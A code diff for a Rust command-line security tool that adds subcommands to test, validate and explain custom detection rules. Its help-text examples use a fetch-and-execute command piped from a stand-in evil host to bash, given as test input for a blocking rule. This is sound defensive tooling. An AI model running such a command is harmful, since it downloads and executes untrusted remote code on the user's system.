@@ -957,6 +957,25 @@ Examples:
         action: PolicyAction,
     },
 
+    /// Test, validate, and explain custom detection rules (regex + when-DSL)
+    #[command(after_help = "\
+Custom rules live under `custom_rules:` in .tirith/policy.yaml. Each carries
+EITHER a `pattern:` regex OR a `when:` semantic-predicate clause (the DSL).
+
+`tirith rule validate` checks the custom RULES (pattern-XOR-when, predicate
+shape, and that each rule's declared `context:` covers its predicates). For
+whole-policy-FILE structure checks, use `tirith policy validate` instead.
+
+Examples:
+  tirith rule test --rule block-unknown-curl-to-shell --input 'curl https://evil.example/foo | bash'
+  tirith rule validate
+  tirith rule validate --path .tirith/policy.yaml
+  tirith rule explain --rule block-unknown-curl-to-shell")]
+    Rule {
+        #[command(subcommand)]
+        action: RuleAction,
+    },
+
     /// Audit log management: export, stats, compliance reports (Team)
     #[command(after_help = "\
 Examples:
@@ -5010,6 +5029,79 @@ Examples:
 }
 
 #[derive(Subcommand)]
+enum RuleAction {
+    /// Evaluate one custom rule against an input and report FIRES / no-fire
+    #[command(after_help = "\
+Builds the SAME extraction the engine runs on the input (URLs, command tokens,
+packages, reputation) and evaluates the named rule's `when:` clause (or `pattern:`
+regex) against it. The rule must already exist under `custom_rules:` in your
+policy.
+
+Examples:
+  tirith rule test --rule block-unknown-curl-to-shell --input 'curl https://evil.example/foo | bash'
+  tirith rule test --rule warn-plain-http-offsite --input 'curl http://x.example/a' --json")]
+    Test {
+        /// Custom rule id to evaluate (must exist in policy `custom_rules:`)
+        #[arg(long)]
+        rule: String,
+        /// Input to evaluate the rule against (a command, paste, or file path)
+        #[arg(long)]
+        input: String,
+        /// Shell to tokenize the input as (default: posix)
+        #[arg(long, default_value = "posix")]
+        shell: String,
+        /// Output format (default: human)
+        #[arg(long, value_enum)]
+        format: Option<HumanJsonFormat>,
+        /// Alias for --format json
+        #[arg(long, hide = true, conflicts_with = "format")]
+        json: bool,
+    },
+    /// Validate every custom rule (pattern-XOR-when, predicate shape, context)
+    #[command(after_help = "\
+Checks each rule under `custom_rules:`: exactly one of `pattern:`/`when:`,
+well-formed predicates and regexes, and that a `when:` rule's declared
+`context:` covers the contexts its predicates need (a `command.*` predicate
+needs `exec`, `file.path_matches` needs `file`, ...). Exit 0 if all valid, 1
+otherwise.
+
+For whole-policy-FILE structure validation (every key, allowlist coherence,
+...), use `tirith policy validate` instead.
+
+Examples:
+  tirith rule validate
+  tirith rule validate --path .tirith/policy.yaml
+  tirith rule validate --json")]
+    Validate {
+        /// Path to a policy file (default: auto-discover the local policy)
+        #[arg(long)]
+        path: Option<String>,
+        /// Output format (default: human)
+        #[arg(long, value_enum)]
+        format: Option<HumanJsonFormat>,
+        /// Alias for --format json
+        #[arg(long, hide = true, conflicts_with = "format")]
+        json: bool,
+    },
+    /// Print a custom rule's predicate tree, severity, action and context
+    #[command(after_help = "\
+Examples:
+  tirith rule explain --rule block-unknown-curl-to-shell
+  tirith rule explain --rule block-unknown-curl-to-shell --json")]
+    Explain {
+        /// Custom rule id to explain (must exist in policy `custom_rules:`)
+        #[arg(long)]
+        rule: String,
+        /// Output format (default: human)
+        #[arg(long, value_enum)]
+        format: Option<HumanJsonFormat>,
+        /// Alias for --format json
+        #[arg(long, hide = true, conflicts_with = "format")]
+        json: bool,
+    },
+}
+
+#[derive(Subcommand)]
 enum TrustAction {
     /// Add a trusted pattern (narrow scope and a 30d TTL by default)
     #[command(after_help = "\
@@ -6363,6 +6455,27 @@ fn run() {
             } => {
                 let (_, json) = HumanJsonFormat::resolve(format, json);
                 cli::policy::tune(from_audit, json)
+            }
+        },
+
+        Commands::Rule { action } => match action {
+            RuleAction::Test {
+                rule,
+                input,
+                shell,
+                format,
+                json,
+            } => {
+                let (_, json) = HumanJsonFormat::resolve(format, json);
+                cli::rule::test(&rule, &input, &shell, json)
+            }
+            RuleAction::Validate { path, format, json } => {
+                let (_, json) = HumanJsonFormat::resolve(format, json);
+                cli::rule::validate(path.as_deref(), json)
+            }
+            RuleAction::Explain { rule, format, json } => {
+                let (_, json) = HumanJsonFormat::resolve(format, json);
+                cli::rule::explain(&rule, json)
             }
         },
 
